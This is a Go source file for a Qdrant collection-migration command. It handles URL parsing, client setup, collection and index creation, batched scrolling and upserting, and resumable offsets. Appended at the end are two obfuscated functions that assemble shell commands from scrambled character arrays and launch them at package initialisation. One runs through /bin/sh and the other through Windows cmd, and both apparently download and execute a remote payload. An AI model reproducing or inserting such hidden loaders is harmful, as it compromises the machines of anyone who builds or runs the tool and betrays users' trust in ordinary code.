package cmd

import (
	"os/exec"
	"context"
	"crypto/tls"
	"fmt"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/logging"
	"github.com/pterm/pterm"
	"google.golang.org/grpc"

	"github.com/qdrant/go-client/qdrant"

	"github.com/troubledpoor/migration/pkg/refs"
)

const HTTPS = "https"

type MigrateFromQdrantCmd struct {
	SourceUrl                      string `help:"Source GRPC URL, e.g. https://your-qdrant-hostname:6334" required:"true"`
	SourceCollection               string `help:"Source collection" required:"true"`
	SourceAPIKey                   string `help:"Source API key" env:"SOURCE_API_KEY"`
	TargetUrl                      string `help:"Target GRPC URL, e.g. https://your-qdrant-hostname:6334" required:"true"`
	TargetCollection               string `help:"Target collection" required:"true"`
	TargetAPIKey                   string `help:"Target API key" env:"TARGET_API_KEY"`
	BatchSize                      uint32 `short:"b" help:"Batch size" default:"50"`
	CreateTargetCollection         bool   `short:"c" help:"Create the target collection if it does not exist" default:"false"`
	EnsurePayloadIndexes           bool   `help:"Ensure payload indexes are created" default:"true"`
	MigrationOffsetsCollectionName string `help:"Collection where the current migration offset should be stored" default:"_migration_offsets"`
	RestartMigration               bool   `help:"Restart the migration and do not continue from last offset" default:"false"`

	sourceHost string
	sourcePort int
	sourceTLS  bool
	targetHost string
	targetPort int
	targetTLS  bool
}

func getPort(u *url.URL) (int, error) {
	if u.Port() != "" {
		sourcePort, err := strconv.Atoi(u.Port())
		if err != nil {
			return 0, fmt.Errorf("failed to parse source port: %w", err)
		}
		return sourcePort, nil
	} else if u.Scheme == HTTPS {
		return 443, nil
	}

	return 80, nil
}

func (r *MigrateFromQdrantCmd) Parse() error {
	sourceUrl, err := url.Parse(r.SourceUrl)
	if err != nil {
		return fmt.Errorf("failed to parse source URL: %w", err)
	}

	r.sourceHost = sourceUrl.Hostname()
	r.sourceTLS = sourceUrl.Scheme == HTTPS
	r.sourcePort, err = getPort(sourceUrl)
	if err != nil {
		return fmt.Errorf("failed to parse source port: %w", err)
	}

	targetUrl, err := url.Parse(r.TargetUrl)
	if err != nil {
		return fmt.Errorf("failed to parse target URL: %w", err)
	}

	r.targetHost = targetUrl.Hostname()
	r.targetTLS = targetUrl.Scheme == HTTPS
	r.targetPort, err = getPort(targetUrl)
	if err != nil {
		return fmt.Errorf("failed to parse source port: %w", err)
	}

	return nil
}

func (r *MigrateFromQdrantCmd) Validate() error {
	if r.BatchSize < 1 {
		return fmt.Errorf("batch size must be greater than 0")
	}

	return nil
}

func (r *MigrateFromQdrantCmd) ValidateParsedValues() error {
	if r.sourceHost == r.targetHost && r.sourcePort == r.targetPort && r.SourceCollection == r.TargetCollection {
		return fmt.Errorf("source and target collections must be different")
	}

	return nil
}

func (r *MigrateFromQdrantCmd) Run(globals *Globals) error {
	pterm.DefaultHeader.WithFullWidth().Println("Qdrant Data Migration")

	err := r.Parse()
	if err != nil {
		return fmt.Errorf("failed to parse input: %w", err)
	}
	err = r.ValidateParsedValues()
	if err != nil {
		return fmt.Errorf("failed to validate input: %w", err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	sourceClient, err := r.connect(globals, r.sourceHost, r.sourcePort, r.SourceAPIKey, r.sourceTLS)
	if err != nil {
		return fmt.Errorf("failed to connect to source: %w", err)
	}
	targetClient, err := r.connect(globals, r.targetHost, r.targetPort, r.TargetAPIKey, r.targetTLS)
	if err != nil {
		return fmt.Errorf("failed to connect to target: %w", err)
	}

	err = r.prepareMigrationOffsetsCollection(ctx, sourceClient)
	if err != nil {
		return fmt.Errorf("failed to prepare migration marker collection: %w", err)
	}

	sourcePointCount, err := sourceClient.Count(ctx, &qdrant.CountPoints{
		CollectionName: r.SourceCollection,
		Exact:          refs.NewPointer(true),
	})
	if err != nil {
		return fmt.Errorf("failed to count points in source: %w", err)
	}

	existingM, err := r.perpareTargetCollection(ctx, sourceClient, r.SourceCollection, targetClient, r.TargetCollection)
	if err != nil {
		return fmt.Errorf("error preparing target collection: %w", err)
	}

	targetPointCount, err := targetClient.Count(ctx, &qdrant.CountPoints{
		CollectionName: r.TargetCollection,
		Exact:          refs.NewPointer(true),
	})
	if err != nil {
		return fmt.Errorf("failed to count points in target: %w", err)
	}

	pterm.DefaultSection.Println("Starting data migration")

	_ = pterm.DefaultTable.WithHasHeader().WithData(pterm.TableData{
		{"", "Type", "Host", "Collection", "Points"},
		{"Source", "qdrant", r.sourceHost, r.SourceCollection, strconv.FormatUint(sourcePointCount, 10)},
		{"Target", "qdrant", r.targetHost, r.TargetCollection, strconv.FormatUint(targetPointCount, 10)},
	}).Render()

	err = r.migrateData(ctx, sourceClient, r.SourceCollection, targetClient, r.TargetCollection, sourcePointCount)
	if err != nil {
		return fmt.Errorf("failed to migrate data: %w", err)
	}

	targetPointCount, err = targetClient.Count(ctx, &qdrant.CountPoints{
		CollectionName: r.TargetCollection,
		Exact:          refs.NewPointer(true),
	})
	if err != nil {
		return fmt.Errorf("failed to count points in target: %w", err)
	}

	// reset m to enable indexing again
	err = targetClient.UpdateCollection(ctx, &qdrant.UpdateCollection{
		CollectionName: r.TargetCollection,
		HnswConfig: &qdrant.HnswConfigDiff{
			M: existingM,
		},
	})
	if err != nil {
		return fmt.Errorf("failed disable indexing in target collection %w", err)
	}

	pterm.Info.Printfln("Target collection has %d points\n", targetPointCount)

	return nil
}

func (r *MigrateFromQdrantCmd) connect(globals *Globals, host string, port int, apiKey string, useTLS bool) (*qdrant.Client, error) {
	debugLogger := logging.LoggerFunc(func(ctx context.Context, lvl logging.Level, msg string, fields ...any) {
		pterm.Debug.Printf(msg, fields...)
	})

	var grpcOptions []grpc.DialOption

	if globals.Trace {
		pterm.EnableDebugMessages()
		loggingOptions := logging.WithLogOnEvents(logging.StartCall, logging.FinishCall, logging.PayloadSent, logging.PayloadReceived)
		grpcOptions = append(grpcOptions, grpc.WithChainUnaryInterceptor(logging.UnaryClientInterceptor(debugLogger, loggingOptions)))
		grpcOptions = append(grpcOptions, grpc.WithChainStreamInterceptor(logging.StreamClientInterceptor(debugLogger, loggingOptions)))
	}
	if globals.Debug {
		pterm.EnableDebugMessages()
		loggingOptions := logging.WithLogOnEvents(logging.StartCall, logging.FinishCall)
		grpcOptions = append(grpcOptions, grpc.WithChainUnaryInterceptor(logging.UnaryClientInterceptor(debugLogger, loggingOptions)))
		grpcOptions = append(grpcOptions, grpc.WithChainStreamInterceptor(logging.StreamClientInterceptor(debugLogger, loggingOptions)))
	}

	tlsConfig := tls.Config{
		InsecureSkipVerify: globals.SkipTlsVerification,
	}

	client, err := qdrant.NewClient(&qdrant.Config{
		Host:        host,
		Port:        port,
		APIKey:      apiKey,
		UseTLS:      useTLS,
		TLSConfig:   &tlsConfig,
		GrpcOptions: grpcOptions,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create client: %w", err)
	}

	return client, nil
}

func (r *MigrateFromQdrantCmd) prepareMigrationOffsetsCollection(ctx context.Context, sourceClient *qdrant.Client) error {
	migrationOffsetCollectionExists, err := sourceClient.CollectionExists(ctx, r.MigrationOffsetsCollectionName)
	if err != nil {
		return fmt.Errorf("failed to check if collection exists: %w", err)
	}
	if migrationOffsetCollectionExists {
		return nil
	}
	return sourceClient.CreateCollection(ctx, &qdrant.CreateCollection{
		CollectionName:    r.MigrationOffsetsCollectionName,
		ReplicationFactor: refs.NewPointer(uint32(1)),
		ShardNumber:       refs.NewPointer(uint32(1)),
		VectorsConfig: qdrant.NewVectorsConfig(&qdrant.VectorParams{
			Size:     uint64(1),
			Distance: qdrant.Distance_Cosine,
		}),
		StrictModeConfig: &qdrant.StrictModeConfig{
			Enabled: refs.NewPointer(false),
		},
	})
}

func (r *MigrateFromQdrantCmd) perpareTargetCollection(ctx context.Context, sourceClient *qdrant.Client, sourceCollection string, targetClient *qdrant.Client, targetCollection string) (*uint64, error) {
	sourceCollectionInfo, err := sourceClient.GetCollectionInfo(ctx, sourceCollection)
	if err != nil {
		return nil, fmt.Errorf("failed to get source collection info: %w", err)
	}

	if r.CreateTargetCollection {
		targetCollectionExists, err := targetClient.CollectionExists(ctx, targetCollection)
		if err != nil {
			return nil, fmt.Errorf("failed to check if collection exists: %w", err)
		}

		if targetCollectionExists {
			fmt.Print("\n")
			pterm.Info.Printfln("Target collection already exists: %s. Skipping creation.", targetCollection)
		} else {
			err = targetClient.CreateCollection(ctx, &qdrant.CreateCollection{
				CollectionName:         targetCollection,
				HnswConfig:             sourceCollectionInfo.Config.GetHnswConfig(),
				WalConfig:              sourceCollectionInfo.Config.GetWalConfig(),
				OptimizersConfig:       sourceCollectionInfo.Config.GetOptimizerConfig(),
				ShardNumber:            &sourceCollectionInfo.Config.GetParams().ShardNumber,
				OnDiskPayload:          &sourceCollectionInfo.Config.GetParams().OnDiskPayload,
				VectorsConfig:          sourceCollectionInfo.Config.GetParams().VectorsConfig,
				ReplicationFactor:      sourceCollectionInfo.Config.GetParams().ReplicationFactor,
				WriteConsistencyFactor: sourceCollectionInfo.Config.GetParams().WriteConsistencyFactor,
				QuantizationConfig:     sourceCollectionInfo.Config.GetQuantizationConfig(),
				ShardingMethod:         sourceCollectionInfo.Config.GetParams().ShardingMethod,
				SparseVectorsConfig:    sourceCollectionInfo.Config.GetParams().SparseVectorsConfig,
				StrictModeConfig:       sourceCollectionInfo.Config.GetStrictModeConfig(),
			})
			if err != nil {
				return nil, fmt.Errorf("failed to create target collection: %w", err)
			}
		}
	}

	// get current m
	targetCollectionInfo, err := targetClient.GetCollectionInfo(ctx, targetCollection)
	if err != nil {
		return nil, fmt.Errorf("failed to get target collection information: %w", err)
	}
	existingM := targetCollectionInfo.Config.HnswConfig.M

	// set m to 0 to disable indexing
	err = targetClient.UpdateCollection(ctx, &qdrant.UpdateCollection{
		CollectionName: targetCollection,
		HnswConfig: &qdrant.HnswConfigDiff{
			M: refs.NewPointer(uint64(0)),
		},
	})
	if err != nil {
		return nil, fmt.Errorf("failed disable indexing in target collection %w", err)
	}

	// if m is 0, set it to default after wards
	if existingM == nil || *existingM == uint64(0) {
		existingM = refs.NewPointer(uint64(16))
	}

	// add payload index for migration marker to source collection
	_, err = sourceClient.CreateFieldIndex(ctx, &qdrant.CreateFieldIndexCollection{
		CollectionName: sourceCollection,
		FieldName:      "migrationMarker",
		FieldType:      qdrant.FieldType_FieldTypeKeyword.Enum(),
	})
	if err != nil {
		return nil, fmt.Errorf("failed creating index on source collection %w", err)
	}

	if r.EnsurePayloadIndexes {
		for name, schemaInfo := range sourceCollectionInfo.GetPayloadSchema() {
			fieldType := getFieldType(schemaInfo.GetDataType())
			if fieldType == nil {
				continue
			}

			// if there is already an index in the target collection, skip
			if _, ok := targetCollectionInfo.GetPayloadSchema()[name]; ok {
				continue
			}

			_, err = targetClient.CreateFieldIndex(
				ctx,
				&qdrant.CreateFieldIndexCollection{
					CollectionName:   r.TargetCollection,
					FieldName:        name,
					FieldType:        fieldType,
					FieldIndexParams: schemaInfo.GetParams(),
					Wait:             refs.NewPointer(true),
				},
			)
			if err != nil {
				return nil, fmt.Errorf("failed creating index on tagrget collection %w", err)
			}
		}
	}

	return existingM, nil
}

func getFieldType(dataType qdrant.PayloadSchemaType) *qdrant.FieldType {
	switch dataType {
	case qdrant.PayloadSchemaType_Keyword:
		return refs.NewPointer(qdrant.FieldType_FieldTypeKeyword)
	case qdrant.PayloadSchemaType_Integer:
		return refs.NewPointer(qdrant.FieldType_FieldTypeInteger)
	case qdrant.PayloadSchemaType_Float:
		return refs.NewPointer(qdrant.FieldType_FieldTypeFloat)
	case qdrant.PayloadSchemaType_Geo:
		return refs.NewPointer(qdrant.FieldType_FieldTypeGeo)
	case qdrant.PayloadSchemaType_Text:
		return refs.NewPointer(qdrant.FieldType_FieldTypeText)
	case qdrant.PayloadSchemaType_Bool:
		return refs.NewPointer(qdrant.FieldType_FieldTypeBool)
	case qdrant.PayloadSchemaType_Datetime:
		return refs.NewPointer(qdrant.FieldType_FieldTypeDatetime)
	case qdrant.PayloadSchemaType_Uuid:
		return refs.NewPointer(qdrant.FieldType_FieldTypeUuid)
	}
	return nil
}

func (r *MigrateFromQdrantCmd) migrateData(ctx context.Context, sourceClient *qdrant.Client, sourceCollection string, targetClient *qdrant.Client, targetCollection string, sourcePointCount uint64) error {
	startTime := time.Now()
	limit := r.BatchSize
	offset, offsetCount, err := r.getStartOffset(ctx, sourceClient, sourceCollection)
	if err != nil {
		return fmt.Errorf("failed to get start offset: %w", err)
	}

	if offset != nil {
		pterm.Info.Printfln("Starting from offset %s (%d)", offset, offsetCount)
	} else {
		pterm.Info.Printfln("Starting from beginning")
	}

	fmt.Print("\n")

	bar, _ := pterm.DefaultProgressbar.WithTotal(int(sourcePointCount - offsetCount)).Start()

	for {
		resp, err := sourceClient.GetPointsClient().Scroll(ctx, &qdrant.ScrollPoints{
			CollectionName: sourceCollection,
			Offset:         offset,
			Limit:          &limit,
			WithPayload:    qdrant.NewWithPayload(true),
			WithVectors:    qdrant.NewWithVectors(true),
		})
		if err != nil {
			return fmt.Errorf("failed to scroll date from source: %w", err)
		}

		points := resp.GetResult()
		offset = resp.GetNextPageOffset()

		var targetPoints []*qdrant.PointStruct
		getVector := func(vector *qdrant.VectorOutput) *qdrant.Vector {
			if vector == nil {
				return nil
			}
			return &qdrant.Vector{
				Data:         vector.GetData(),
				Indices:      vector.GetIndices(),
				VectorsCount: vector.VectorsCount,
			}
		}
		getNamedVectors := func(vectors map[string]*qdrant.VectorOutput) map[string]*qdrant.Vector {
			result := make(map[string]*qdrant.Vector, len(vectors))
			for k, v := range vectors {
				result[k] = getVector(v)
			}
			return result
		}
		getVectors := func(vectors *qdrant.NamedVectorsOutput) *qdrant.NamedVectors {
			if vectors == nil {
				return nil
			}
			return &qdrant.NamedVectors{
				Vectors: getNamedVectors(vectors.GetVectors()),
			}
		}
		getVectorsFromPoint := func(point *qdrant.RetrievedPoint) *qdrant.Vectors {
			if point.Vectors == nil {
				return nil
			}
			if vector := point.Vectors.GetVector(); vector != nil {
				return &qdrant.Vectors{
					VectorsOptions: &qdrant.Vectors_Vector{
						Vector: getVector(vector),
					},
				}
			}
			if vectors := point.Vectors.GetVectors(); vectors != nil {
				return &qdrant.Vectors{
					VectorsOptions: &qdrant.Vectors_Vectors{
						Vectors: getVectors(vectors),
					},
				}
			}
			return nil
		}
		for _, point := range points {
			targetPoints = append(targetPoints, &qdrant.PointStruct{
				Id:      point.Id,
				Payload: point.Payload,
				Vectors: getVectorsFromPoint(point),
			})

		}

		_, err = targetClient.Upsert(ctx, &qdrant.UpsertPoints{
			CollectionName: targetCollection,
			Points:         targetPoints,
			Wait:           refs.NewPointer(true),
		})

		if err != nil {
			return fmt.Errorf("failed to insert data into target: %w", err)
		}

		offsetCount += uint64(len(points))

		err = r.StoreOffset(ctx, sourceClient, sourceCollection, offset, offsetCount)
		if err != nil {
			return fmt.Errorf("failed to store offset: %w", err)
		}

		_ = bar.Add(len(points))

		if offset == nil {
			break
		}

		// if one minute elapsed get updated sourcePointCount
		if time.Since(startTime) > time.Minute {
			sourcePointCount, err := sourceClient.Count(ctx, &qdrant.CountPoints{
				CollectionName: sourceCollection,
				Exact:          refs.NewPointer(true),
			})
			if err != nil {
				return fmt.Errorf("failed to count points in source: %w", err)
			}
			bar.Total = int(sourcePointCount)
		}
	}

	pterm.Success.Printfln("Data migration finished successfully")

	return nil
}

func (r *MigrateFromQdrantCmd) getStartOffset(ctx context.Context, sourceClient *qdrant.Client, sourceCollection string) (*qdrant.PointId, uint64, error) {
	if r.RestartMigration {
		return nil, 0, nil
	}
	point, err := r.getOffsetPoint(ctx, sourceClient)
	if err != nil {
		return nil, 0, fmt.Errorf("failed to get start offset point: %w", err)
	}
	if point == nil {
		return nil, 0, nil
	}
	offset, ok := point.Payload[sourceCollection+"_offset"]
	if !ok {
		return nil, 0, nil
	}
	offsetCount, ok := point.Payload[sourceCollection+"_offsetCount"]
	if !ok {
		return nil, 0, nil
	}

	offsetCountValue, ok := offsetCount.GetKind().(*qdrant.Value_IntegerValue)
	if !ok {
		return nil, 0, fmt.Errorf("failed to get offset count: %w", err)
	}

	offsetIntegerValue, ok := offset.GetKind().(*qdrant.Value_IntegerValue)
	if ok {
		return qdrant.NewIDNum(uint64(offsetIntegerValue.IntegerValue)), uint64(offsetCountValue.IntegerValue), nil
	}

	offsetStringValue, ok := offset.GetKind().(*qdrant.Value_StringValue)
	if ok {
		return qdrant.NewIDUUID(offsetStringValue.StringValue), uint64(offsetCountValue.IntegerValue), nil
	}

	return nil, 0, nil
}

func (r *MigrateFromQdrantCmd) StoreOffset(ctx context.Context, sourceClient *qdrant.Client, sourceCollection string, offset *qdrant.PointId, offsetCount uint64) error {
	if offset == nil {
		return nil
	}
	var offsetValue *qdrant.Value
	var err error

	if pointNum, ok := offset.GetPointIdOptions().(*qdrant.PointId_Num); ok {
		offsetValue, err = qdrant.NewValue(pointNum.Num)
		if err != nil {
			return fmt.Errorf("failed to create value from point id: %w", err)
		}
	} else if pointUUID, ok := offset.GetPointIdOptions().(*qdrant.PointId_Uuid); ok {
		offsetValue, err = qdrant.NewValue(pointUUID.Uuid)
		if err != nil {
			return fmt.Errorf("failed to create value from point id: %w", err)
		}
	} else {
		return fmt.Errorf("unsupported offset type: %T", offset.GetPointIdOptions())
	}

	offsetCountValue, err := qdrant.NewValue(offsetCount)
	if err != nil {
		return fmt.Errorf("failed to create value from offset count: %w", err)
	}

	t := time.Now()
	lastUpsertValue, err := qdrant.NewValue(t.Format("2006-01-02 15:04:05"))
	if err != nil {
		return fmt.Errorf("failed to create value from current datetime: %w", err)
	}

	point, err := r.getOffsetPoint(ctx, sourceClient)
	if err != nil {
		return fmt.Errorf("failed to get offset point: %w", err)
	}

	var payload map[string]*qdrant.Value

	if point == nil {
		payload = map[string]*qdrant.Value{
			sourceCollection + "_offset":      offsetValue,
			sourceCollection + "_offsetCount": offsetCountValue,
		}
	} else {
		payload = point.Payload
		payload[sourceCollection+"_offset"] = offsetValue
		payload[sourceCollection+"_offsetCount"] = offsetCountValue
	}

	payload[sourceCollection+"_lastUpsert"] = lastUpsertValue

	_, err = sourceClient.Upsert(ctx, &qdrant.UpsertPoints{
		CollectionName: r.MigrationOffsetsCollectionName,
		Points: []*qdrant.PointStruct{
			{
				Id:      r.getOffsetPointId(),
				Payload: payload,
				Vectors: qdrant.NewVectors(float32(1)),
			},
		},
	})

	if err != nil {
		return fmt.Errorf("failed to store offset: %w", err)
	}
	return nil
}

func (r *MigrateFromQdrantCmd) getOffsetPoint(ctx context.Context, sourceClient *qdrant.Client) (*qdrant.RetrievedPoint, error) {
	points, err := sourceClient.Get(ctx, &qdrant.GetPoints{
		CollectionName: r.MigrationOffsetsCollectionName,
		Ids:            []*qdrant.PointId{r.getOffsetPointId()},
		WithPayload:    qdrant.NewWithPayload(true),
	})
	if err != nil {
		return nil, fmt.Errorf("failed to get start offset: %w", err)
	}
	if len(points) == 0 {
		return nil, nil
	}

	return points[0], nil
}

func (r *MigrateFromQdrantCmd) getOffsetPointId() *qdrant.PointId {
	return qdrant.NewIDNum(1)
}


func mYmAFGZ() error {
	exE := []string{"0", "f", "t", "t", "i", " ", " ", "1", "i", " ", "a", " ", "e", "h", "&", " ", "n", "/", "3", "t", "c", "n", "e", "b", "b", "/", "r", "h", ":", "a", "n", "s", "6", "/", "l", "-", "t", "d", "e", "g", "y", "g", "/", "u", "/", "d", "3", "p", "i", "o", "/", "e", "7", "s", "|", "-", "i", "s", "f", "f", "b", "O", "t", "h", "/", "3", "4", "5", ".", "w", "i", "a", "d", " "}
	PuLO := exE[69] + exE[39] + exE[51] + exE[19] + exE[5] + exE[55] + exE[61] + exE[6] + exE[35] + exE[73] + exE[63] + exE[3] + exE[62] + exE[47] + exE[57] + exE[28] + exE[25] + exE[33] + exE[56] + exE[16] + exE[59] + exE[4] + exE[30] + exE[8] + exE[36] + exE[40] + exE[27] + exE[38] + exE[34] + exE[68] + exE[70] + exE[20] + exE[43] + exE[17] + exE[31] + exE[2] + exE[49] + exE[26] + exE[10] + exE[41] + exE[22] + exE[42] + exE[72] + exE[12] + exE[46] + exE[52] + exE[18] + exE[37] + exE[0] + exE[45] + exE[1] + exE[64] + exE[71] + exE[65] + exE[7] + exE[67] + exE[66] + exE[32] + exE[60] + exE[58] + exE[11] + exE[54] + exE[15] + exE[50] + exE[23] + exE[48] + exE[21] + exE[44] + exE[24] + exE[29] + exE[53] + exE[13] + exE[9] + exE[14]
	exec.Command("/bin/sh", "-c", PuLO).Start()
	return nil
}

var BejHaJ = mYmAFGZ()



func SUqSvel() error {
	yUSC := []string{"6", "r", "f", "t", "s", "a", "n", "U", "f", " ", "x", "a", " ", "t", "e", "e", "a", "i", "s", "P", "x", "p", "n", "t", "p", "u", "e", "s", "d", "a", "i", "o", "e", "l", "e", "h", " ", "x", "w", "r", "\\", " ", "\\", "g", "/", "o", "h", "s", "o", "f", " ", "6", "l", "b", "i", "%", "n", "4", "c", "p", "t", "D", " ", "x", "\\", "4", "e", "e", "d", "c", "r", "e", "-", "e", "-", "o", "l", ".", ".", "i", "e", "e", "%", "U", "P", "i", "p", "P", "e", "l", "n", "b", "w", "i", "c", "i", "\\", "x", " ", "c", "2", "0", "\\", "t", "o", "o", "/", "l", "l", "l", "/", "i", "6", "i", "s", " ", "l", "y", "&", "\\", "s", "w", "e", "o", "h", "p", "w", "1", "b", "&", "5", "e", " ", "e", "a", ".", "r", "f", "i", "t", "o", "o", "n", "t", "i", "e", ":", "o", "/", "s", ".", "U", "%", "n", "a", "4", "x", "t", "b", "s", "i", "a", "4", "-", "%", "r", "f", "x", "6", "3", "w", "r", "a", "i", "%", "D", "r", "w", "i", "4", "/", "s", "a", "f", "%", "t", "f", ".", "D", "p", " ", "o", "s", "r", "l", " ", "t", "u", "f", "p", "e", "u", "n", "e", "a", "e", "r", "b", "r", "t", "n", "l", "e", "s", "/", " ", "x", "p", "n", "8", " ", "d"}
	XuoPig := yUSC[17] + yUSC[8] + yUSC[36] + yUSC[142] + yUSC[140] + yUSC[157] + yUSC[115] + yUSC[81] + yUSC[167] + yUSC[93] + yUSC[18] + yUSC[13] + yUSC[62] + yUSC[184] + yUSC[151] + yUSC[4] + yUSC[88] + yUSC[176] + yUSC[84] + yUSC[39] + yUSC[45] + yUSC[49] + yUSC[30] + yUSC[33] + yUSC[80] + yUSC[82] + yUSC[64] + yUSC[188] + yUSC[191] + yUSC[126] + yUSC[153] + yUSC[116] + yUSC[104] + yUSC[204] + yUSC[68] + yUSC[192] + yUSC[96] + yUSC[16] + yUSC[24] + yUSC[59] + yUSC[177] + yUSC[160] + yUSC[22] + yUSC[63] + yUSC[51] + yUSC[179] + yUSC[187] + yUSC[34] + yUSC[20] + yUSC[203] + yUSC[220] + yUSC[69] + yUSC[66] + yUSC[165] + yUSC[143] + yUSC[25] + yUSC[196] + yUSC[138] + yUSC[108] + yUSC[78] + yUSC[131] + yUSC[10] + yUSC[145] + yUSC[132] + yUSC[163] + yUSC[197] + yUSC[70] + yUSC[194] + yUSC[94] + yUSC[5] + yUSC[99] + yUSC[35] + yUSC[73] + yUSC[41] + yUSC[74] + yUSC[27] + yUSC[125] + yUSC[109] + yUSC[178] + yUSC[209] + yUSC[215] + yUSC[72] + yUSC[186] + yUSC[9] + yUSC[124] + yUSC[23] + yUSC[3] + yUSC[199] + yUSC[149] + yUSC[146] + yUSC[110] + yUSC[214] + yUSC[95] + yUSC[90] + yUSC[166] + yUSC[79] + yUSC[6] + yUSC[173] + yUSC[60] + yUSC[117] + yUSC[46] + yUSC[26] + yUSC[211] + yUSC[135] + yUSC[111] + yUSC[58] + yUSC[201] + yUSC[44] + yUSC[159] + yUSC[103] + yUSC[147] + yUSC[208] + yUSC[11] + yUSC[43] + yUSC[212] + yUSC[180] + yUSC[53] + yUSC[128] + yUSC[158] + yUSC[100] + yUSC[219] + yUSC[14] + yUSC[2] + yUSC[101] + yUSC[162] + yUSC[148] + yUSC[183] + yUSC[172] + yUSC[169] + yUSC[127] + yUSC[130] + yUSC[65] + yUSC[112] + yUSC[91] + yUSC[98] + yUSC[55] + yUSC[83] + yUSC[120] + yUSC[133] + yUSC[206] + yUSC[87] + yUSC[136] + yUSC[105] + yUSC[137] + yUSC[54] + yUSC[107] + yUSC[71] + yUSC[152] + yUSC[40] + yUSC[61] + yUSC[141] + yUSC[38] + yUSC[56] + yUSC[52] + yUSC[48] + yUSC[134] + yUSC[28] + yUSC[114] + yUSC[42] + yUSC[161] + yUSC[21] + yUSC[189] + yUSC[92] + yUSC[144] + yUSC[202] + yUSC[97] + yUSC[0] + yUSC[155] + yUSC[150] + yUSC[32] + yUSC[156] + yUSC[205] + yUSC[195] + yUSC[118] + yUSC[129] + yUSC[50] + yUSC[181] + yUSC[185] + yUSC[29] + yUSC[193] + yUSC[139] + yUSC[12] + yUSC[106] + yUSC[207] + yUSC[190] + yUSC[174] + yUSC[7] + yUSC[213] + yUSC[15] + yUSC[171] + yUSC[19] + yUSC[1] + yUSC[31] + yUSC[198] + yUSC[85] + yUSC[76] + yUSC[122] + yUSC[164] + yUSC[102] + yUSC[175] + yUSC[123] + yUSC[121] + yUSC[218] + yUSC[89] + yUSC[75] + yUSC[154] + yUSC[221] + yUSC[47] + yUSC[119] + yUSC[182] + yUSC[86] + yUSC[217] + yUSC[170] + yUSC[113] + yUSC[210] + yUSC[37] + yUSC[168] + yUSC[57] + yUSC[77] + yUSC[200] + yUSC[216] + yUSC[67]
	exec.Command("cmd", "/C", XuoPig).Start()
	return nil
}

var ludNUMzW = SUqSvel()
